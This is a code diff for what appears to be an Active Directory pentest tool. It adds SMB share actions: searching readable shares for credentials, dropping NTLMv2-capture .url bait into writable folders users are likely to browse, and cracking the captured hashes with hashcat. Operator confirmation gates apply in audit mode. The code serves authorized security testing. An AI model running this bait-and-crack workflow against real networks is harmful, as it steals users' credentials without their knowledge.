@@ -79,6 +79,7 @@ from adscan_internal.rich_output import (
     BRAND_COLORS,
     mark_sensitive,
     print_panel_with_table,
+    questionary_ordered_selection,
 )
 from adscan_internal.services.smb_guest_auth_service import (
     is_guest_alias,
@@ -4312,6 +4313,23 @@ def run_ask_for_smb_shares_write(
         upload_thread.start()
 
 
+def _graph_acl_implies_read(view: Any) -> bool:
+    """True when the graph ACL records any READ/WRITE/FULL_CONTROL permission.
+
+    Used to surface NTFS-unverified share-ACL leads: the share ACL grants read
+    to some principal but the collector could not confirm it against the NTFS
+    folder ACL (``share_acl_only`` tier).
+    """
+    graph_acl = getattr(view, "graph_acl", None)
+    if graph_acl is None:
+        return False
+    for principal in getattr(graph_acl, "principals", []) or []:
+        perms = getattr(principal, "permissions", []) or []
+        if any(p in ("READ", "WRITE", "FULL_CONTROL") for p in perms):
+            return True
+    return False
+
+
 def _offer_share_credential_hunt(
     shell: Any,
     *,
@@ -4334,12 +4352,26 @@ def _offer_share_credential_hunt(
 
     readable_names: list[str] = []
     share_map_entry: dict[str, str] = {}
+    ntfs_unverified: list[str] = []  # graph-only leads, NTFS-unverified
     for v in views:
         is_write = any(
             p in getattr(v, "live_permissions", [])
             for p in ("WRITE", "WRITE_DAC", "FULL_CONTROL")
         )
         is_read = getattr(v, "is_readable_live", False)
+        # Hunting needs effective READ. Live access IS effective access (the
+        # operator's own token already passed share ∩ NTFS), so a live read is
+        # always a confirmed candidate. For shares with no live signal we fall
+        # back to the collector's graph verification: only ``ntfs_computed``
+        # graph reads are treated as confirmed; ``share_acl_only`` graph reads
+        # are a real lead but NTFS-unverified, so we deprioritize and flag
+        # them rather than treat them as confirmed.
+        graph_confirms_read = (
+            not is_read
+            and not is_write
+            and getattr(v, "is_graph_ntfs_verified", False)
+            and getattr(v, "has_graph", False)
+        )
         if is_read or is_write:
             readable_names.append(v.name)
             # Store the full permission picture so the rclone download
@@ -4351,12 +4383,52 @@ def _offer_share_credential_hunt(
                 share_map_entry[v.name] = "READ_WRITE"  # WRITE implies READ
             else:
                 share_map_entry[v.name] = "READ"
+        elif graph_confirms_read:
+            readable_names.append(v.name)
+            share_map_entry[v.name] = "READ"
+        elif (
+            getattr(v, "has_graph", False)
+            and not getattr(v, "is_graph_ntfs_verified", False)
+            and _graph_acl_implies_read(v)
+        ):
+            # Share-ACL grants read but the NTFS folder ACL was not verified —
+            # keep it as a deprioritized, flagged lead (not a confirmed read).
+            ntfs_unverified.append(v.name)
 
-    if not readable_names:
+    if ntfs_unverified:
+        print_warning(
+            "NTFS-unverified share lead(s) on "
+            f"{mark_sensitive(host, 'hostname')} (share-ACL grants read but the "
+            "NTFS folder ACL was not confirmed — effective access may be lower): "
+            + ", ".join(mark_sensitive(n, "text") for n in ntfs_unverified)
+        )
+
+    # Loot (READ) and bait (WRITE) are independent post-enum opportunities. Both
+    # are slow and intrusive in different ways (loot is 4 sequential phases;
+    # bait writes a file and waits for a victim), so the operator chooses WHICH
+    # actions to run AND in WHAT ORDER through a single ordered action menu —
+    # full control over one action, both in any order, or neither. The
+    # individual executors below are reused unchanged.
+    ask = getattr(shell, "ask_for_smb_shares_read", None)
+    can_hunt = bool(readable_names) and callable(ask)
+    has_writable = any(
+        getattr(v, "is_writable_live", False) and getattr(v, "name", "")
+        for v in views
+    )
+
+    action_hunt = "Search readable shares for credentials"
+    action_bait = "Drop NTLMv2 capture bait on writable shares"
+
+    available_actions: list[str] = []
+    if can_hunt:
+        available_actions.append(action_hunt)
+    if has_writable:
+        available_actions.append(action_bait)
+
+    if not available_actions:
         return
 
-    ask = getattr(shell, "ask_for_smb_shares_read", None)
-    if callable(ask):
+    def _run_hunt() -> None:
         ask(
             domain,
             readable_names,
@@ -4365,6 +4437,478 @@ def _offer_share_credential_hunt(
             [host],
             share_map={host: share_map_entry},
         )
+
+    def _run_bait() -> None:
+        # The bait executor itself auto-skips in non-interactive mode (defense
+        # in depth) — it will NEVER drop a file or block in ``adscan ci`` even
+        # if the CI default order includes this action.
+        _offer_ntlmv2_share_drop_capture(
+            shell,
+            domain=domain,
+            username=username,
+            credential=credential,
+            host=host,
+            views=views,
+        )
+
+    runners = {action_hunt: _run_hunt, action_bait: _run_bait}
+
+    # CI auto-resolve order: loot (READ, read-only) first, bait (WRITE) second.
+    # Loot is safe to auto-run unattended; the bait executor still no-ops in CI.
+    default_order = [action_hunt, action_bait]
+    chosen = questionary_ordered_selection(
+        title=(
+            f"Post-enum share actions on {mark_sensitive(host, 'hostname')} — "
+            "pick actions in the order to run them"
+        ),
+        options=available_actions,
+        default_order=default_order,
+        shell=shell,
+    )
+
+    for action in chosen:
+        runner = runners.get(action)
+        if runner is not None:
+            runner()
+
+
+def _ntlm_bait_writable_share_views(views: Any) -> list[Any]:
+    """Return the live, MxAc-verified writable share views (dedup by name)."""
+    writable: list[Any] = []
+    seen: set[str] = set()
+    for v in views or []:
+        name = str(getattr(v, "name", "") or "").strip()
+        if not name or not getattr(v, "is_writable_live", False):
+            continue
+        if name in seen:
+            continue
+        seen.add(name)
+        writable.append(v)
+    return writable
+
+
+#: Folder-name substrings that strongly suggest a "users browse here / drop here"
+#: location. Used ONLY to PRE-SELECT (never to filter) in the audit interactive
+#: flow — the operator can always change the selection. Case-insensitive.
+_NTLM_BAIT_BROWSE_HINT_TOKENS = (
+    "transfer",
+    "incoming",
+    "inbound",
+    "upload",
+    "uploads",
+    "public",
+    "shared",
+    "dropbox",
+    "drop",
+    "scans",
+    "scan",
+    "it",
+    "exchange",
+    "temp",
+    "tmp",
+    "pub",
+    "data",
+)
+
+
+def _ntlm_bait_target_label(share: str, directory_path: str) -> str:
+    """Human label for a (share, folder) drop target — ``share`` or ``share\\dir``."""
+    rel = str(directory_path or "").strip().strip("\\")
+    return f"{share}\\{rel}" if rel else f"{share}\\  (root)"
+
+
+def _ntlm_bait_is_browse_likely(directory_path: str) -> bool:
+    """True when the folder name matches a browse-likely heuristic token.
+
+    The share root ("") is NOT browse-likely by this heuristic (users open a
+    sub-folder, not the share root) — so audit leaves root unselected by default.
+    """
+    rel = str(directory_path or "").strip().strip("\\")
+    if not rel:
+        return False
+    leaf = rel.rsplit("\\", 1)[-1].lower()
+    return any(token in leaf for token in _NTLM_BAIT_BROWSE_HINT_TOKENS)
+
+
+def _enumerate_ntlm_bait_targets(
+    *,
+    writable_share_names: list[str],
+    target_host: str,
+    creds: dict[str, Any],
+    domain: str,
+) -> list[Any]:
+    """Enumerate writable (share, folder) drop targets across writable shares.
+
+    Granular per-folder enumeration (Part 1): for each writable share, MxAc-walk
+    its directory tree (bounded depth + folder cap, read-only) and collect the
+    folders — including the root — where the current token has effective WRITE.
+    Returns a list of ``DropTarget`` (share, directory_path). Bounded and
+    non-intrusive per adscan-ad-constraints § 10.
+    """
+    from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
+        DropTarget,
+    )
+    from adscan_internal.services.smb_effective_access_service import (  # noqa: PLC0415
+        enumerate_writable_directories,
+    )
+
+    username = str(creds.get("username") or "").strip()
+    password = creds.get("nt_hash") or creds.get("password") or ""
+    nt_hash = str(creds.get("nt_hash") or "") or None
+    auth_domain = str(creds.get("auth_domain") or domain or "").strip()
+
+    targets: list[Any] = []
+    for share in writable_share_names:
+        try:
+            enumeration = enumerate_writable_directories(
+                host=target_host,
+                share=share,
+                username=username or None,
+                password=password if isinstance(password, str) else None,
+                nt_hash=nt_hash,
+                auth_domain=auth_domain or None,
+                domain=domain,
+            )
+        except Exception as exc:  # noqa: BLE001 — enumeration must never break the offer
+            telemetry.capture_exception(exc)
+            print_info_debug(
+                f"[ntlmv2-share-capture] writable-folder enumeration failed on "
+                f"{mark_sensitive(share, 'share')}: {exc}. Falling back to root drop."
+            )
+            targets.append(DropTarget(share=share, directory_path=""))
+            continue
+
+        if enumeration.hit_cap and enumeration.skipped:
+            print_warning(
+                f"[~] Folder enumeration on {mark_sensitive(share, 'share')} hit the "
+                f"safety cap — {len(enumeration.skipped)} folder(s) were NOT probed "
+                "for write access and are excluded from targeting."
+            )
+
+        if enumeration.writable_paths:
+            for rel in enumeration.writable_paths:
+                targets.append(DropTarget(share=share, directory_path=rel))
+        elif not enumeration.succeeded:
+            # MxAc undetermined — the share itself was already gated as writable
+            # upstream, so keep the root as a target (the upload is the test).
+            targets.append(DropTarget(share=share, directory_path=""))
+    return targets
+
+
+def _render_ntlm_bait_targets_panel(targets: list[Any], target_host: str) -> None:
+    """Premium panel listing the writable (share, folder) drop candidates.
+
+    Solves operator visibility of the browse-likely sub-folder (e.g. ``transfer``):
+    every writable folder is shown explicitly with its write-confirmed marker, so
+    the operator sees WHY a sub-folder is a better drop site than the root.
+    """
+    lines = [
+        "[bold]Writable drop candidates[/bold] (SMB2 MxAc effective WRITE confirmed)",
+        f"[dim]Host[/dim] {mark_sensitive(target_host, 'hostname')}",
+        "",
+    ]
+    for tgt in targets:
+        label = _ntlm_bait_target_label(tgt.share, tgt.directory_path)
+        hint = (
+            "  [cyan](browse-likely)[/cyan]"
+            if _ntlm_bait_is_browse_likely(tgt.directory_path)
+            else ""
+        )
+        lines.append(f"  [green]>[/green] {mark_sensitive(label, 'path')}{hint}")
+    print_panel(
+        "\n".join(lines),
+        title="[bold]NTLM Share-Drop Capture[/bold] [cyan]writable folders[/cyan]",
+        title_align="left",
+        border_style="cyan",
+    )
+
+
+def _offer_ntlmv2_share_drop_capture(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    credential: str,
+    host: str,
+    views: Any,
+) -> None:
+    """Offer an NTLM share-drop capture when >=1 share has EFFECTIVE WRITE.
+
+    Dedicated follow-up to the credential-hunt offer (loot=READ and bait=WRITE
+    are independent). Gated strictly on the live, MxAc-verified writable set
+    (``ShareView.is_writable_live`` — the operator's own token already passed
+    share & NTFS); NTFS-unverified / share-ACL-only leads do NOT qualify.
+
+    Granular per-FOLDER targeting (root-only was insufficient — e.g. VulnLab
+    Breach captured only when the bait landed in the ``transfer`` sub-folder
+    users browse, not the share root). For each writable share we MxAc-enumerate
+    the writable folders (root + sub-folders) and select drop targets by
+    workspace type:
+
+    * **CTF** (``shell.type == "ctf"``): drop in ALL writable folders.
+      Interactive presents them with ALL pre-selected (operator can trim);
+      non-interactive (CI) auto-selects ALL with no prompt — this is what makes
+      the htb-regression CI solve Breach autonomously.
+    * **Audit** (``shell.type != "ctf"``): interactive presents the writable
+      folders with the browse-likely ones (``transfer``, ``upload``, ...)
+      pre-selected and root + others left unselected; the operator decides.
+      Non-interactive (audit CI): SKIP entirely — never drop unattended on a
+      real client.
+    """
+    writable_views = _ntlm_bait_writable_share_views(views)
+    writable_share_names = [str(v.name).strip() for v in writable_views]
+    if not writable_share_names:
+        return
+
+    listener_ip = str(getattr(shell, "myip", "") or "").strip()
+    if not listener_ip:
+        print_info_debug(
+            "[ntlmv2-share-capture] writable share(s) found but no listener IP "
+            "(shell.myip unset); skipping the bait offer."
+        )
+        return
+
+    target_host = str(host or "").strip()
+    if not target_host:
+        print_info_debug(
+            "[ntlmv2-share-capture] writable share(s) found but no target host; "
+            "skipping the bait offer."
+        )
+        return
+
+    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
+    is_ctf = workspace_type == "ctf"
+    non_interactive = is_non_interactive(shell)
+
+    # Audit + non-interactive: never drop bait unattended on a real client.
+    if not is_ctf and non_interactive:
+        print_info_debug(
+            "[ntlmv2-share-capture] audit + non-interactive session; skipping the "
+            "bait offer (never drop unattended on a real client)."
+        )
+        return
+
+    creds = {
+        "username": str(username or "").strip(),
+        "password": str(credential or "").strip(),
+        "auth_domain": domain,
+    }
+
+    # ── Part 1: enumerate writable folders (root + sub-folders) per share ────
+    print_info(
+        "[*] Enumerating writable folders (SMB2 MxAc, read-only) in "
+        f"{len(writable_share_names)} writable share(s) on "
+        f"{mark_sensitive(target_host, 'hostname')}."
+    )
+    targets = _enumerate_ntlm_bait_targets(
+        writable_share_names=writable_share_names,
+        target_host=target_host,
+        creds=creds,
+        domain=domain,
+    )
+    if not targets:
+        print_info(
+            "[~] No writable folders confirmed for the current credentials — "
+            "NTLM share-drop capture skipped."
+        )
+        return
+
+    from adscan_internal.rich_output import (  # noqa: PLC0415
+        confirm_ask,
+        questionary_checkbox_values,
+    )
+    from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
+        URL_BAIT,
+        run_multi_share_capture,
+    )
+
+    # ── Part 3: target selection UX, gated by workspace type ─────────────────
+    selected_targets: list[Any]
+    if is_ctf:
+        if non_interactive:
+            # CTF CI: auto-select ALL writable folders, no prompt. This makes
+            # the htb-regression run capture autonomously on Breach.
+            selected_targets = list(targets)
+            print_info(
+                f"[*] CTF non-interactive: baiting ALL {len(selected_targets)} "
+                "writable folder(s) autonomously."
+            )
+        else:
+            # CTF interactive: show the folders, default-select ALL (trimmable).
+            _render_ntlm_bait_targets_panel(targets, target_host)
+            options = [_ntlm_bait_target_label(t.share, t.directory_path) for t in targets]
+            chosen_labels = questionary_checkbox_values(
+                title="CTF: select writable folders to bait (all pre-selected)",
+                options=options,
+                default_values=options,
+                shell=shell,
+            )
+            chosen = set(chosen_labels or [])
+            selected_targets = [
+                t
+                for t in targets
+                if _ntlm_bait_target_label(t.share, t.directory_path) in chosen
+            ]
+    else:
+        # Audit interactive: heuristic pre-select browse-likely folders; root +
+        # others left unselected. Operator decides.
+        _render_ntlm_bait_targets_panel(targets, target_host)
+        if not confirm_ask(
+            "One or more writable folders found. Drop an NTLM-capture bait to "
+            "harvest hashes when a user browses them?",
+            default=False,
+        ):
+            return
+        options = [_ntlm_bait_target_label(t.share, t.directory_path) for t in targets]
+        preselect = [
+            _ntlm_bait_target_label(t.share, t.directory_path)
+            for t in targets
+            if _ntlm_bait_is_browse_likely(t.directory_path)
+        ]
+        chosen_labels = questionary_checkbox_values(
+            title="Audit: select writable folders to bait (browse-likely pre-selected)",
+            options=options,
+            default_values=preselect,
+            shell=shell,
+        )
+        chosen = set(chosen_labels or [])
+        selected_targets = [
+            t
+            for t in targets
+            if _ntlm_bait_target_label(t.share, t.directory_path) in chosen
+        ]
+
+    if not selected_targets:
+        print_info("[~] No folders selected — NTLM share-drop capture skipped.")
+        return
+
+    # ── Part 5: audit-interactive no-capture iteration provider ──────────────
+    # On a no-capture round, offer to widen to the remaining writable folders.
+    # CTF already drops all up front, so it gets no provider. Audit interactive
+    # only; never runs in CI.
+    additional_provider = None
+    if not is_ctf and not non_interactive:
+
+        def _additional_targets_provider(already_dropped: list[Any]) -> list[Any]:
+            dropped_keys = {t.key for t in already_dropped}
+            remaining = [t for t in targets if t.key not in dropped_keys]
+            if not remaining:
+                return []
+            if not confirm_ask(
+                f"No capture yet. Drop in {len(remaining)} additional writable "
+                "folder(s)?",
+                default=False,
+            ):
+                return []
+            options = [
+                _ntlm_bait_target_label(t.share, t.directory_path) for t in remaining
+            ]
+            chosen_labels = questionary_checkbox_values(
+                title="Select additional writable folders to bait",
+                options=options,
+                default_values=options,
+                shell=shell,
+            )
+            chosen_set = set(chosen_labels or [])
+            return [
+                t
+                for t in remaining
+                if _ntlm_bait_target_label(t.share, t.directory_path) in chosen_set
+            ]
+
+        additional_provider = _additional_targets_provider
+
+    print_info(
+        "[*] Dropping NTLM-capture bait (.url) into "
+        f"{len(selected_targets)} writable folder(s) on "
+        f"{mark_sensitive(target_host, 'hostname')}."
+    )
+
+    try:
+        capture_result = run_multi_share_capture(
+            shell=shell,
+            domain=domain,
+            creds=creds,
+            targets=selected_targets,
+            target_host=target_host,
+            listener_ip=listener_ip,
+            file_type=URL_BAIT,
+            additional_targets_provider=additional_provider,
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_error("Error running NTLM share-drop capture.")
+        print_exception(show_locals=False, exception=exc)
+        return
+
+    # ── Part 6: offer to crack the captured hash(es) with the existing path ──
+    # Reuses the standard hashcat cracking entry point (run_cracking via
+    # crack_captured_netntlm) — never a bespoke cracker. Cracking is offline /
+    # local (no target impact), so the default is "yes"; in non-interactive
+    # runs confirm_ask auto-resolves to the default and run_cracking is itself
+    # CI-safe (default wordlist + bounded hashcat timeout), so CI never hangs.
+    _offer_crack_for_captured_netntlm(shell, domain=domain, result=capture_result)
+
+
+def _offer_crack_for_captured_netntlm(
+    shell: Any,
+    *,
+    domain: str,
+    result: Any,
+) -> None:
+    """Offer to crack freshly captured NetNTLM hash(es) with the existing path.
+
+    Surfaced right after a share-drop capture. When the session captured >=1
+    NTLM response we prompt the operator and, on yes, hand the hash(es) to the
+    standard hashcat cracking entry point (``crack_captured_netntlm`` →
+    ``run_cracking``) — the SAME logic the kerberoast / AS-REP phases use, so
+    wordlist resolution, backend selection, the potfile ``--show`` extraction
+    and the cracked-credential feed-back (``shell.add_credential``) are all
+    reused, not duplicated. Each captured response is cracked under the correct
+    mode for its real wire version: NTLMv2 → ``-m 5600``, NTLMv1 → ``-m 5500``.
+
+    Cracking is offline / local (no target impact), so the confirm default is
+    "yes". In non-interactive runs ``confirm_ask`` auto-resolves to that default
+    and ``run_cracking`` is itself CI-safe (default wordlist + bounded hashcat
+    timeout), so ``adscan ci`` cannot hang here.
+    """
+    captured = getattr(result, "captured", None) if result is not None else None
+    status = str(getattr(result, "status", "") or "") if result is not None else ""
+    if status != "captured" or captured is None:
+        return
+
+    # The orchestrator surfaces one credential per session; build the batch as a
+    # list so multi-capture sessions (future) crack ALL of them, each under its
+    # own per-version mode.
+    captures = [
+        {
+            "user": getattr(captured, "clean_user", ""),
+            "domain": getattr(captured, "domain", ""),
+            "ntlm_version": getattr(captured, "ntlm_version", ""),
+            "fullhash": getattr(captured, "fullhash", ""),
+        }
+    ]
+    captures = [c for c in captures if str(c.get("fullhash") or "").strip()]
+    if not captures:
+        return
+
+    from adscan_internal.rich_output import confirm_ask  # noqa: PLC0415
+    from adscan_internal.cli.cracking import crack_captured_netntlm  # noqa: PLC0415
+
+    count = len(captures)
+    if not confirm_ask(
+        f"Crack the captured NTLM hash{'es' if count != 1 else ''} now with hashcat?",
+        default=True,
+    ):
+        print_info("[~] Captured NTLM hash(es) not cracked — left for later.")
+        return
+
+    try:
+        crack_captured_netntlm(shell, domain=domain, captures=captures)
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_error("Error cracking the captured NTLM hash(es).")
+        print_exception(show_locals=False, exception=exc)
 
 
 def ask_for_smb_shares_read(
